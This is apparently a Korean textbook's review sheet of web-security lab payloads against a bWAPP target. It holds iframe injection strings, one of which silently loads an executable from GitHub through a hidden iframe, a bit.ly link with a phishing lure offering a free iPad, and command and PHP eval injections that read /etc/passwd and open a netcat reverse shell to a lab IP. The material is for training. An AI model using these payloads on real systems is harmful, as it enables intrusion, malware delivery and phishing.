# 대표 예제 복습: 웹 보안

##  제2장 HTML Injection
+ iFrame Injection ········· Page 100
+ iframe 104p ~ 112p iframe 인젝션 코드들
```
# 104p_iframe 인젝션 코드
robots.txt height="250" width="250"></iframe><iframe frameborder="0" src=htmli_get.php height="500" width="700"></iframe>

# 105p_iframe 인젝션 코드
robots.txt" height="250" width="250"></iframe><iframe frameborder="0" src=htmli_get.php height="500" width="700"></iframe>

# 106p_iframe 인젝션 코드
robots.txt" height="250" width="250"></iframe><iframe frameborder="0" src=htmli_get.php height="500" width="700"></iframe><iframe>

# 107p_iframe 인젝션 코드
robots.txt" height="250" width="250"></iframe><iframe frameborder="0" src=htmli_get.php height="500" width="700">

# 108p_iframe 인젝션 코드
robots.txt" height="250" width="250"></iframe><iframe frameborder="0" src= htmli_get.php height="0" width="0">

# 109p_iframe 인젝션 코드
robots.txt" height="250" width="250"></iframe><iframe frameborder="0" src= https://github.com/ncs10322/security/raw/main/MsgBox.exe height="0" width="0">

# 110p_사회 공학적 기법을 이용한 iframe 인젝션 공격
 4) 사회 공학적 기법을 이용한 iframe 인젝션 공격

 ① 

인젝션 코드

robots.txt" height="250" width="250"></iframe><iframe frameborder="0" src= https://github.com/ncs10322/security/raw/main/MsgBox.exe height="0" width="0">

URL 인코딩 인젝션 코드

robots.txt%22%20height%3D%22250%22%20width%3D%22250%22%3E%3C%2Fiframe%3E%3Ciframe%20frameborder%3D%220%22%20src%3D%20https%3A%2F%2Fgithub.com%2Fncs10322%2Fsecurity%2Fraw%2Fmain%2FMsgBox.exe%20height%3D%220%22%20width%3D%220%22%3E


 ② 

인젝션 위치

http://192.168.20.205/bWAPP/iframei.php?ParamUrl=인젝션 위치&ParamWidth=250&ParamHeight=250
인젝션 URL 코드

http://192.168.20.205/bWAPP/iframei.php?ParamUrl=robots.txt%22%20height%3D%22250%22%20width%3D%22250%22%3E%3C%2Fiframe%3E%3Ciframe%20frameborder%3D%220%22%20src%3D%20https%3A%2F%2Fgithub.com%2Fncs10322%2Fsecurity%2Fraw%2Fmain%2FMsgBox.exe%20height%3D%220%22%20width%3D%220%22%3E&ParamWidth=250&ParamHeight=250

 ③ 

https://bit.ly/43C8Nj6


 ④ 

제목 : 아이패드 무료 선착순 1000명 지급
본문 :

다음 링크를 클릭하여 신청하세요.

https://bit.ly/43C8Nj6

# 112p_iframe 인젝션 코드
robots.txt" height="250" width="250"></iframe><iframe frameborder="0" src=htmli_get.php height="500" width="700">
```
+ OS Command Injection ········· Page 119
+ 120p_OS Command 인젝션 코드
```
# 120p_OS Command 인젝션 코드
www.google.com ; cat /etc/passwd | head -3

# 121p_OS Command 인젝션 코드
www.google.com ; nc -e /bin/bash 192.168.20.50 4444

# 123p_OS Command 인젝션 코드
www.google.com ; cat /etc/passwd | head -3

# 125p_eval_php
<?php
echo "TEST1". '<br>';
eval("echo \"TEST2\";"). '<br>';
?>
<br>
<?php
eval("echo \"TEST3\"; system('cat /etc/passwd | head -3');");
?>

# 128p_eval 인젝션 코드
; system('cat /etc/passwd | head -3')


; system('nc -e /bin/bash 192.168.20.50 4444')


```

##  제6장 SQL Injection
+ SQL Injection (GET/Search) ········· Page 216
+ SQL Injection (Login Form/Hero) ········· Page 254

##  제8장 XSS Injection
+ XSS(Cross Site Scripting) ········· Page 366
+ XSS - Reflected (JSON) ········· Page 384
+ XSS - Reflected (AJAX/JSON) ········· Page 388
+ XSS - Reflected (Referer) ········· Page 428


##  제11장 Path Traversal
+ Directory Traversal - Directories ········· Page 490
+ Directory Traversal - Files ········· Page 495

##  제14장 Remote & Local File Inclusion
+ Local File Inclusion ········· Page 534
+ Remote File Inclusion ········· Page 538

##  제17장 Unvalidated Redirects & Forwards
+ Unvalidated Redirects & Forwards (1) ········· Page 564
+ Unvalidated Redirects & Forwards (2) ········· Page 573
